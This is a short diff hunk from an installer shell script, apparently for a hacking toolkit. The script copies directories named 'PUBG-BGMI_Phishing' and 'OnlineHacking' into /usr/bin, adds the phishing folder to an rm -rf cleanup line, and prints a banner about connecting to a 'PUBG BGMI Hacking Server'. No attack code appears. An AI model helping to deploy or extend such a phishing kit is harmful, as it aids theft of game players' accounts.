@@ -171,7 +171,7 @@ cp -R BGMI /usr/bin/
 cp -R PUBG-BGMI_Phishing /usr/bin/
 cp -R OnlineHacking /usr/bin/
 echo
-rm -rf SUMAN SUMAN1 
+rm -rf SUMAN SUMAN1 PUBG-BGMI_Phishing
 echo
 echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
 sleep 2
